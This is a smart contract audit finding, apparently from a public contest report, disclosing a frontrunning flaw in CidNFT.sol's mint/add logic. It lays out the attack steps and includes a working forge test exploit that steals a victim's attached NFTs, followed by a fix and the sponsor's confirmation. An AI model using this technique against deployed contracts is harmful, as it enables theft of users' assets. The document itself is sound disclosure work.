[H-01] Attacker can frontrun a victim’smint+addtransaction to steal NFT
Submitted bypopular00, also found bygzeon
CidNFT.sol#L147CidNFT.sol#L165CidNFT.sol#L237
High - an attacker can steal deposited NFTs from victims using themint()+add()functionality inCidNFT.sol
Proof of Concept
One of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to theirCidNFT. TheCidNFTcontract custodies these attached NFTs, and they are regarded as “traits” of the user.
The protocol currently includes functionality for a user to mint aCidNFTas their identity and then optionally add a subprotocol NFT to thatCidNFTin the same transaction. This occurs in themint()function ofCidNFT.sol, which takes a byte array ofadd()parameters and includes a loop whereadd()can be repeatedly called with these parameters to attach subprotocol NFTs to theCidNFT.
function mint(bytes[] calldata _addList) external {_mint(msg.sender, ++numMinted);bytes4 addSelector = this.add.selector;for (uint256 i = 0; i < _addList.length; ++i) {(bool success /*bytes memory result*/, ) = address(this).delegatecall(abi.encodePacked(addSelector, _addList[i]));if (!success) revert AddCallAfterMintingFailed(i);}}
One of the arguments foradd()is the_cidNFTIDto which the user would like to attach their outside NFT. However,_cidNFTIDis specified in calldata tomint(), and there is no guarantee that the user is actuallyadd()ing to theCidNFTthat they just minted. There is only a check inadd()that the user is either the owner or approved for thatCidNFT.
function add(uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the userstring calldata _subprotocolName,uint256 _key,uint256 _nftIDToAdd,AssociationType _type) external {...............if (cidNFTOwner != msg.sender &&getApproved[_cidNFTID] != msg.sender &&!isApprovedForAll[cidNFTOwner][msg.sender]) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);...............}
This opens up the following attack:
Victim sends a transaction expecting to mintCidNFT #100, and includes calldata toadd()their SubprotocolNFT to the token in the same txAttacker frontruns this transaction with amint()with noadd()parameters, receivesCidNFT #100, and sets the victim as approved for that tokenThe victim’s transaction begins execution, and they instead receive token #101, though theiradd()calldata still specifies token #100The victim’sadd()call continues, and their SubprotocolNFT is registered toCidNFT #100and transferred to theCidNFTcontractThe attacker can then either revoke approval to the victim forCidNFT #100or immediately callremove()to transfer the victim’s SubprotocolNFT to themselves
Below is a forge test executing this attack. This should run if dropped intoCidNFT.t.sol.
function testMaliciousMint() public {uint256 cidTokenId = cidNFT.numMinted() + 1;(uint256 subTokenId1, uint256 subTokenId2) = (1, 2);(uint256 key1, uint256 key2) = (1, 2);// user1 == attacker// user2 == victim// Frontrun the victim's mint by minting the cidNFT token they expect before themvm.startPrank(user1);cidNFT.mint(new bytes[](0));// Set the victim (user2) as approved for the token user1 just mintedcidNFT.setApprovalForAll(user2, true);vm.stopPrank();// Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract// for the subtokens, and prepare the addlist with the incorrect cidNFT token idvm.startPrank(user2);sub1.mint(user2, subTokenId1);sub1.mint(user2, subTokenId2);sub1.setApprovalForAll(address(cidNFT), true);bytes[] memory addList = new bytes[](2);addList[0] = abi.encode(cidTokenId,"sub1",key1,subTokenId1,CidNFT.AssociationType.ORDERED);addList[1] = abi.encode(cidTokenId,"sub1",key2,subTokenId2,CidNFT.AssociationType.ORDERED);// Mint user2 a new CidNFT and attach the subtokens to user1's CidNFTcidNFT.mint(addList);vm.stopPrank();// Confirm that user1's CidNFT has the subtokens and can transfer them outvm.startPrank(user1);cidNFT.remove(cidTokenId,"sub1",key1,subTokenId1,CidNFT.AssociationType.ORDERED);cidNFT.remove(cidTokenId,"sub1",key2,subTokenId2,CidNFT.AssociationType.ORDERED);vm.stopPrank();// Confirm that user1 now holds the subtokensassertEq(cidNFT.ownerOf(cidTokenId), user1);assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);assertEq(sub1.ownerOf(subTokenId1), user1);assertEq(sub1.ownerOf(subTokenId2), user1);}## Tools UsedManual review## Recommended Mitigation Steps- Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs
OpenCoreCH (Canto Identity) confirmed and commented:
Great finding, will be fixed.